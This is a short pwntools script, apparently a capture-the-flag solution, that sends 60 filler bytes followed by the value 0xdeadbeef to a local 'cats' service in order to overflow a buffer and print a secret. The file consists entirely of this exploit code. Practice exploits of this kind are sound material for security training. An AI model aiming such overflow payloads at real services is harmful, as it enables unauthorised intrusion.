from pwn import *

# p = process("./cats")
p = remote("localhost", 5000)
p.recvuntil(b"cats?")
p.sendline(b"A"*60 + p32(0xdeadbeef))
# p.recvuntil(b"secret: \n")
# info(p.recvallS())
print(p.recvallS())
